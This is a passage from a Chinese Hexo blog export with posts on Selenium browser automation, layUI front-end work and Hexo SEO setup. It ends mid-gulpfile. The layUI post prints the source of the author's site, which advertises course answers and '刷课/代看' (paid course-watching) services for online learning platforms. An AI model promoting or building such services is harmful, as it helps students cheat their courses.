<h3 id="浏览器的控制"><a href="#浏览器的控制" class="headerlink" title="浏览器的控制"></a>浏览器的控制</h3><h4 id="设置浏览器大小"><a href="#设置浏览器大小" class="headerlink" title="设置浏览器大小"></a>设置浏览器大小</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">browser.maximize_window() <span class="comment">#最大化</span></span><br><span class="line"></span><br><span class="line">browser.minimize_window() <span class="comment">#最小化</span></span><br><span class="line"></span><br><span class="line">browser.set_window_size(<span class="number">480</span>, <span class="number">800</span>) <span class="comment">#设置浏览器宽480、高800显示</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="浏览器前进后退"><a href="#浏览器前进后退" class="headerlink" title="浏览器前进后退"></a>浏览器前进后退</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">browser.forword()  <span class="comment">#前进</span></span><br><span class="line"> </span><br><span class="line">browser.back() <span class="comment">#后退</span></span><br></pre></td></tr></table></figure>



<h3 id="操作对象的几种方法"><a href="#操作对象的几种方法" class="headerlink" title="操作对象的几种方法"></a>操作对象的几种方法</h3><ul>
<li>click——点击对象</li>
<li>send_keys——在对象上模拟按键输入</li>
<li>clear——清除对象的内容，如果可以的话</li>
<li>submit——提交对象的内容，如果可以的话</li>
<li>text——用于获取元素的文本信息</li>
</ul>
<h3 id="控制键盘"><a href="#控制键盘" class="headerlink" title="控制键盘"></a>控制键盘</h3><p> 要想调用键盘按键操作需要引入 keys 包</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium.webdriver.common.keys <span class="keyword">import</span> Keys</span><br><span class="line">send_keys(Keys.TAB) <span class="comment"># TAB</span></span><br><span class="line">send_keys(Keys.ENTER) <span class="comment"># 回车</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#ctrl+a 全选输入框内容 </span></span><br><span class="line">driver.find_element_by_id(<span class="string">&quot;kw&quot;</span>).send_keys(Keys.CONTROL,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#ctrl+x 剪切输入框内容 </span></span><br><span class="line">driver.find_element_by_id(<span class="string">&quot;kw&quot;</span>).send_keys(Keys.CONTROL,<span class="string">&#x27;x&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h3 id="控制鼠标"><a href="#控制鼠标" class="headerlink" title="控制鼠标"></a>控制鼠标</h3><p>引入方法</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium.webdriver.common.action_chains <span class="keyword">import</span> ActionChains</span><br></pre></td></tr></table></figure>

<p>ActionChains 常用方法：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">perform()  <span class="comment">#执行所有ActionChains 中存储的行为；</span></span><br><span class="line">click()          <span class="comment">#单机鼠标右箭</span></span><br><span class="line">context_click()  <span class="comment">#右击；</span></span><br><span class="line">double_click()   <span class="comment">#双击；</span></span><br><span class="line">drag_and_drop()  <span class="comment">#拖动；</span></span><br><span class="line">move_to_element()  <span class="comment">#鼠标悬停。</span></span><br></pre></td></tr></table></figure>

<p>实例：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#定位到要双击的元素</span></span><br><span class="line">qqq =driver.find_element_by_xpath(<span class="string">&quot;xxx&quot;</span>) </span><br><span class="line"><span class="comment">#对定位到的元素执行鼠标双击操作 </span></span><br><span class="line">ActionChains(driver).double_click(qqq).perform()</span><br><span class="line">   </span><br><span class="line">    </span><br><span class="line"><span class="comment">#定位元素的原位置 </span></span><br><span class="line">element = driver.find_element_by_name(<span class="string">&quot;source&quot;</span>) </span><br><span class="line"><span class="comment">#定位元素要移动到的目标位置 </span></span><br><span class="line">target = driver.find_element_by_name(<span class="string">&quot;target&quot;</span>)</span><br><span class="line"><span class="comment">#执行元素的移动操作 </span></span><br><span class="line">ActionChains(driver).drag_and_drop(element, target).perform()      </span><br></pre></td></tr></table></figure>

<h3 id="定位到新页面"><a href="#定位到新页面" class="headerlink" title="定位到新页面"></a>定位到新页面</h3><p>有时候点击进入一个新页面，需要利用窗口话柄定位到新的页面。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">browser.switch_to.window(browser.window_handles[<span class="number">1</span>])</span><br></pre></td></tr></table></figure>

<h3 id="定位下拉框"><a href="#定位下拉框" class="headerlink" title="定位下拉框"></a>定位下拉框</h3><h4 id="定位select类型下拉框"><a href="#定位select类型下拉框" class="headerlink" title="定位select类型下拉框"></a>定位select类型下拉框</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium.webdriver.support.ui <span class="keyword">import</span> Select</span><br><span class="line"><span class="comment"># 通过index进行选择</span></span><br><span class="line">Select(driver.find_element_by_name(<span class="string">&quot;form:j_idt163&quot;</span>)).select_by_index(<span class="number">1</span>) </span><br><span class="line"><span class="comment"># 通过value进行选择</span></span><br><span class="line">Select(driver.find_element_by_name(<span class="string">&quot;form:j_idt163&quot;</span>)).select_by_value(<span class="string">&quot;中风险&quot;</span>)</span><br><span class="line"><span class="comment"># 通过选项文字进行选择</span></span><br><span class="line">Select(driver.find_element_by_name(<span class="string">&quot;form:j_idt163&quot;</span>)).select_by_visible_text(<span class="string">&quot;低风险&quot;</span>)</span><br></pre></td></tr></table></figure>

<h3 id="selenium的拓展——appium"><a href="#selenium的拓展——appium" class="headerlink" title="selenium的拓展——appium"></a>selenium的拓展——appium</h3><p>手机app自动化，也是十分强大，后期需要再研究。</p>
]]></content>
      <categories>
        <category>开发</category>
      </categories>
      <tags>
        <tag>selenium</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>layUI前端开发</title>
    <url>/2020/02/15/layUI%E5%89%8D%E7%AB%AF%E5%BC%80%E5%8F%91/</url>
    <content><![CDATA[<script type="text/javascript" src="/js/src/bai.js"></script>
<p>layUI是个门槛极其低的国产前端框架，很适合个人简单开发一个后台，尤其是不怎么会前端的后端人员。</p>
<p>整个使用以及各个模块的使用官方文档都十分详细。</p>
<h3 id="开发过程中也遇到很多问题"><a href="#开发过程中也遇到很多问题" class="headerlink" title="开发过程中也遇到很多问题"></a>开发过程中也遇到很多问题</h3><h4 id="js文件引入的位置"><a href="#js文件引入的位置" class="headerlink" title="js文件引入的位置"></a>js文件引入的位置</h4><p>之前以为在那里引入都行，在前面引入就先加载，后面引入就后加载，但在实际的开发中发现，并不行。会引起js堵塞，个人理解，这可能是js的性质决定的，它具有覆盖性，因为是一行行执行的，后面的执行可能对前面的代码有影响而造成混乱</p>
<h4 id="不怎么稳定"><a href="#不怎么稳定" class="headerlink" title="不怎么稳定"></a>不怎么稳定</h4><p>可能是因为我代码写的有问题，弹窗模块在嵌入别的代码之后就不运行。</p>
<p>搜题网站主页源码：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;cn&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">title</span>&gt;</span>大学僧搜题<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;360-site-verification&quot;</span> <span class="attr">content</span>=<span class="string">&quot;5d799044f733881a285c1a1b93c61c72&quot;</span> /&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1, maximum-scale=1&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;description&quot;</span> <span class="attr">content</span>=<span class="string">&quot;智慧树是全球知名的学分课程服务平台,提供各类智慧树答案、知到答案、学习通答案、尔雅答案、尔雅代看、超星答案、名华在线等网络教育软件及课程,在线互动教育学堂.&quot;</span> /&gt;</span> </span><br><span class="line">	<span class="tag">&lt;<span class="name">meta</span> <span class="attr">itemprop</span>=<span class="string">&quot;name&quot;</span> <span class="attr">content</span>=<span class="string">&quot;2019（知到）智慧树答案-（超星尔雅）学习通答案&quot;</span> /&gt;</span> </span><br><span class="line">	<span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;keywords&quot;</span> <span class="attr">content</span>=<span class="string">&quot;学习通,智慧树答案,智慧树,智慧树刷课,尔雅答案,高校邦答案,智慧树代看,尔雅代看,名华在线,超星软件,智慧树软件,高校邦软件&quot;</span> /&gt;</span> </span><br><span class="line">	<span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;./souti_layui/css/index.css&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span> <span class="attr">href</span>=<span class="string">&quot;./souti_layui/css/layui.css&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">&quot;layui-nav layui-bg-green&quot;</span> <span class="attr">lay-filter</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;layui-nav-item layui-this&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span>搜题首页<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span>		  </span><br><span class="line">			<span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;layui-nav-item&quot;</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:daohang1();&quot;</span>&gt;</span>友链<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">dl</span> <span class="attr">class</span>=<span class="string">&quot;layui-nav-child&quot;</span>&gt;</span> <span class="comment">&lt;!-- 二级菜单 --&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">dd</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://www.wowoha.com/&quot;</span>&gt;</span>免费电影<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">dd</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">dd</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://hao.su/909/&quot;</span>&gt;</span>BT磁力<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">dd</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">dd</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://www.jiumodiary.com/&quot;</span>&gt;</span>免费小说<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">dd</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">dd</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://www.gequdaquan.net/gqss/&quot;</span>&gt;</span>歌曲答全<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">dd</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;/<span class="name">dl</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;layui-nav-item&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://lanyingwl.cn/&quot;</span>&gt;</span>大学僧刷课<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">		</span><br><span class="line">		</span><br><span class="line">		<span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;text-align: center;&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;./souti_layui/img/logo.jpg&quot;</span> <span class="attr">id</span>=<span class="string">&quot;logo&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">		</span><br><span class="line">		</span><br><span class="line">			<span class="tag">&lt;<span class="name">form</span> <span class="attr">class</span>=<span class="string">&quot;layui-form&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> &gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;layui-form-item&quot;</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;layui-input-block&quot;</span> <span class="attr">id</span>=<span class="string">&quot;wer&quot;</span>&gt;</span></span><br><span class="line">					<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;w&quot;</span> <span class="attr">required</span> <span class="attr">lay-verify</span>=<span class="string">&quot;required&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;只需输入问题&quot;</span> <span class="attr">autocomplete</span>=<span class="string">&quot;off&quot;</span> <span class="attr">class</span>=<span class="string">&quot;layui-input&quot;</span> <span class="attr">id</span>=<span class="string">&quot;search&quot;</span> &gt;</span></span><br><span class="line">					</span><br><span class="line">				<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">class</span>=<span class="string">&quot;layui-btn&quot;</span> <span class="attr">id</span>=<span class="string">&quot;btn&quot;</span>&gt;</span>搜题<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">				</span><br><span class="line">		</span><br><span class="line">		</span><br><span class="line">		</span><br><span class="line">				<span class="tag">&lt;<span class="name">blockquote</span> <span class="attr">class</span>=<span class="string">&quot;layui-elem-quote&quot;</span> <span class="attr">style</span>=<span class="string">&quot;margin-top:30px;&quot;</span>&gt;</span></span><br><span class="line">					&lt;?</span><br><span class="line">					echo &quot;题库一：&quot;;</span><br><span class="line">					echo file_get_contents(&#x27;&#x27;);</span><br><span class="line">					?&gt; </span><br><span class="line">				<span class="tag">&lt;/<span class="name">blockquote</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">blockquote</span> <span class="attr">class</span>=<span class="string">&quot;layui-elem-quote&quot;</span> <span class="attr">style</span>=<span class="string">&quot;margin-top:30px;&quot;</span>&gt;</span></span><br><span class="line">					&lt;?</span><br><span class="line">					echo &quot;题库二：&quot;;</span><br><span class="line">					echo file_get_contents(&#x27;&#x27;);</span><br><span class="line">					?&gt; </span><br><span class="line">				<span class="tag">&lt;/<span class="name">blockquote</span>&gt;</span></span><br><span class="line">				</span><br><span class="line">				</span><br><span class="line">				</span><br><span class="line">				</span><br><span class="line">				</span><br><span class="line">						<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;footer_f&quot;</span>&gt;</span></span><br><span class="line">						<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;./souti_layui/duty.html&quot;</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span>&gt;</span>免责声明<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span>|<span class="symbol">&amp;nbsp;</span></span><br><span class="line">						<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;./souti_layui/about.html&quot;</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span>&gt;</span>联系我们<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">						<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://souti.lyoo.xyz/&quot;</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span>&gt;</span>大学僧<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span>版权所有<span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span>©2018-2020<span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span>鲁ICP备19007553号-1<span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span></span><br><span class="line">						<span class="tag">&lt;/<span class="name">div</span>&gt;</span> </span><br><span class="line">						</span><br><span class="line">						</span><br><span class="line">						</span><br><span class="line">						</span><br><span class="line">				<span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;./souti_layui/js/layui.all.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">					<span class="comment">//导航</span></span></span><br><span class="line"><span class="javascript">					<span class="function"><span class="keyword">function</span> <span class="title">daohang1</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">							<span class="keyword">var</span> element = layui.element;</span></span><br><span class="line"><span class="javascript">						</span></span><br><span class="line"><span class="javascript">					&#125;;</span></span><br><span class="line"><span class="javascript">				</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">				</span><br><span class="line">				<span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="javascript"><span class="keyword">var</span> cnzz_protocol = ((<span class="string">&quot;https:&quot;</span> == <span class="built_in">document</span>.location.protocol) ? <span class="string">&quot;https://&quot;</span> : <span class="string">&quot;http://&quot;</span>);<span class="built_in">document</span>.write(<span class="built_in">unescape</span>(<span class="string">&quot;%3Cspan id=&#x27;cnzz_stat_icon_1278039450&#x27;%3E%3C/span%3E%3Cscript src=&#x27;&quot;</span> + cnzz_protocol + <span class="string">&quot;s4.cnzz.com/z_stat.php%3Fid%3D1278039450%26online%3D2&#x27; type=&#x27;text/javascript&#x27;%3E%3C/script%3E&quot;</span>));</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span>		</span><br><span class="line">	<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>开发</category>
      </categories>
      <tags>
        <tag>开发</tag>
        <tag>layUI</tag>
        <tag>前端</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo博客优化</title>
    <url>/2020/01/29/hexo%E5%8D%9A%E5%AE%A2%E4%BC%98%E5%8C%96/</url>
    <content><![CDATA[<script type="text/javascript" src="/js/src/bai.js"></script>
<p>seo就是搜索引擎优化，利用百度等搜索引擎的合理规则使其要优化的关键词在搜索引擎达到一个好的排名，最终展现给需要的人看到，也就是让百度等搜索引擎收录，别人更容易百度到你网站的内容。</p>
<p>我进行的简单优化如下：</p>
<h3 id="添加sitmap"><a href="#添加sitmap" class="headerlink" title="添加sitmap"></a>添加sitmap</h3><p>Sitemap 可方便网站管理员通知搜索引擎他们网站上有哪些可供抓取的网页。<br>安装命令：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">npm install hexo<span class="literal">-generator</span><span class="literal">-sitemap</span> -<span class="literal">-save</span> <span class="comment">#sitemap.xml适合提交给谷歌搜素引擎</span></span><br><span class="line">npm install hexo<span class="literal">-generator</span><span class="literal">-baidu</span><span class="literal">-sitemap</span> -<span class="literal">-save</span> <span class="comment">#baidusitemap.xml适合提交百度搜索引擎</span></span><br></pre></td></tr></table></figure>

<p>然后博客主配置文件_config.yml中添加以下代码：</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 自动生成sitemap</span></span><br><span class="line"><span class="attr">sitemap:</span></span><br><span class="line">    <span class="attr">path:</span> <span class="string">sitemap.xml</span></span><br><span class="line"><span class="attr">baidusitemap:</span></span><br><span class="line">    <span class="attr">path:</span> <span class="string">baidusitemap.xml</span></span><br></pre></td></tr></table></figure>

<p>之后每次部署都会在public目录下生成itemap.xml和baidusitemap.xml，这就是你的站点地图。</p>
<p>但是！一开始添加sitmap报错了！报错信息：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">FATAL duplicated mapping key at line <span class="number">116</span>, column <span class="number">1</span>:</span><br><span class="line">    path: baidusitemap.xml</span><br></pre></td></tr></table></figure>

<p>后来查明原因，可能因为hexo版本问题，在_config.yml中添加代码时格式错误，一开始填写的错误格式为：</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 自动生成sitemap</span></span><br><span class="line"><span class="attr">sitemap:</span></span><br><span class="line"><span class="attr">path:</span> <span class="string">sitemap.xml</span></span><br><span class="line"><span class="attr">baidusitemap:</span></span><br><span class="line"><span class="attr">path:</span> <span class="string">baidusitemap.xml</span></span><br></pre></td></tr></table></figure>
<h3 id="优化文章目录结构"><a href="#优化文章目录结构" class="headerlink" title="优化文章目录结构"></a>优化文章目录结构</h3><p>一开始的文章目录结构默认是：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://z3p5.github.io/z3p5/2020/01/28/php弱类型比较/</span><br></pre></td></tr></table></figure>

<p>这样层数太多，不利于搜索引擎的爬虫爬去我们的文章。</p>
<p>将博客主配置文件_config.yml中的代码修改如下：</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">url:</span> <span class="string">http://你的网站</span></span><br><span class="line"><span class="attr">root:</span> <span class="string">/</span></span><br><span class="line"><span class="attr">permalink:</span> <span class="string">:title.html</span></span><br><span class="line"><span class="attr">permalink_defaults:</span></span><br></pre></td></tr></table></figure>
<p>优化后的文章目录结构：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://z3p5.github.io/z3p5/php%E5%BC%B1%E7%B1%BB%E5%9E%8B%E6%AF%94%E8%BE%83.html</span><br></pre></td></tr></table></figure>
<h3 id="修改post-md文件"><a href="#修改post-md文件" class="headerlink" title="修改post.md文件"></a>修改post.md文件</h3><p>发现了新大陆，原来\scaffolds\post.md文件是控制文章默认属性头的，之前一直复制粘贴……<br>贴一下我的文章属性头</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: &#123;&#123; title &#125;&#125;</span><br><span class="line">date: &#123;&#123; date &#125;&#125;</span><br><span class="line">tags:</span><br><span class="line">categories:</span><br><span class="line">keywords:</span><br><span class="line">description:</span><br><span class="line">top<span class="emphasis">_img:</span></span><br><span class="line"><span class="emphasis">cover:</span></span><br><span class="line"><span class="emphasis">hide:</span></span><br><span class="line"><span class="emphasis">---</span></span><br></pre></td></tr></table></figure>
<p>这是我比较常用的，要根据自己的主题而定。</p>
<h3 id="安装nofollow插件"><a href="#安装nofollow插件" class="headerlink" title="安装nofollow插件"></a>安装nofollow插件</h3><p>减少出站链接能够有效防止权重分散</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">npm install hexo<span class="literal">-autonofollow</span> -<span class="literal">-save</span></span><br></pre></td></tr></table></figure>
<p>然后在博客主配置文件_config.yml中添加代码：</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">nofollow:</span></span><br><span class="line">    <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">exclude:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">www.xxxxx.com</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">友链地址</span>  </span><br></pre></td></tr></table></figure>
<p>这样例外的链接不会被加上nofollow属性。</p>
<h3 id="添加robots-txt"><a href="#添加robots-txt" class="headerlink" title="添加robots.txt"></a>添加robots.txt</h3><p>在source文件夹中新建文件robots.txt，可以参考一下我的：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">User-agent: * Allow: /</span><br><span class="line">Allow: /archives/</span><br><span class="line">Disallow: /vendors/</span><br><span class="line">Disallow: /categories/</span><br><span class="line"></span><br><span class="line">Sitemap: https://z3p5.github.io/sitemap.xml</span><br><span class="line">Sitemap: https://z3p5.github.io/baidusitemap.xml</span><br></pre></td></tr></table></figure>
<h3 id="将链接提交到百度、谷歌"><a href="#将链接提交到百度、谷歌" class="headerlink" title="将链接提交到百度、谷歌"></a>将链接提交到百度、谷歌</h3><p>这里我用的butterfly主题，配置文件比较方便。</p>
<p><a href="https://ziyuan.baidu.com/site/">百度搜索引擎提交入口</a></p>
<p><a href="https://www.google.com/webmasters/">谷歌搜索引擎提交入口</a></p>
<p>之后选择html验证方式，添加代码验证即可。谷歌收录较快，百度需要等一段时间。</p>
<h3 id="开启自动推送"><a href="#开启自动推送" class="headerlink" title="开启自动推送"></a>开启自动推送</h3><p>把以下代码放到blog\themes\Butterfly\source\js\src目录下，并命名为bai.js</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> bp = <span class="built_in">document</span>.createElement(<span class="string">&#x27;script&#x27;</span>);</span><br><span class="line">    bp.src = <span class="string">&#x27;//push.zhanzhang.baidu.com/push.js&#x27;</span>;</span><br><span class="line">    <span class="keyword">var</span> s = <span class="built_in">document</span>.getElementsByTagName(<span class="string">&quot;script&quot;</span>)[<span class="number">0</span>];</span><br><span class="line">    s.parentNode.insertBefore(bp, s);</span><br><span class="line">&#125;)();</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>并在scffolds\post.md文件（模板文件）中加入一行代码：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span> src=<span class="string">&quot;/js/src/bai.js&quot;</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>才知道原来在md文件可以直接放js代码，html标签等，神奇！</p>
<p>这样只要访问你的这个页面，就会自动向百度推送你的这个网页。</p>
<h3 id="开启gulp压缩"><a href="#开启gulp压缩" class="headerlink" title="开启gulp压缩"></a>开启gulp压缩</h3><p>gulp可以帮助我们将网址中的源码空格和换号去掉，压缩css、js和图片文件，这样就可以提高网站的访问速度。</p>
<p>安装gulp：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">npm install gulp <span class="literal">-g</span> -<span class="literal">-save</span></span><br><span class="line">npm install gulp<span class="literal">-htmlclean</span> gulp<span class="literal">-htmlmin</span> gulp<span class="literal">-minify</span><span class="literal">-css</span> gulp<span class="literal">-uglify</span> gulp<span class="literal">-imagemin</span> -<span class="literal">-save</span></span><br></pre></td></tr></table></figure>
<p>在博客跟目录下创建gulpfile.js文件：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> gulp = <span class="built_in">require</span>(<span class="string">&#x27;gulp&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> minifycss = <span class="built_in">require</span>(<span class="string">&#x27;gulp-minify-css&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> uglify = <span class="built_in">require</span>(<span class="string">&#x27;gulp-uglify&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> htmlmin = <span class="built_in">require</span>(<span class="string">&#x27;gulp-htmlmin&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> htmlclean = <span class="built_in">require</span>(<span class="string">&#x27;gulp-htmlclean&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取 gulp-imagemin 模块</span></span><br><span class="line"><span class="keyword">var</span> imagemin = <span class="built_in">require</span>(<span class="string">&#x27;gulp-imagemin&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 压缩 public 目录 css</span></span><br><span class="line">gulp.task(<span class="string">&#x27;minify-css&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span 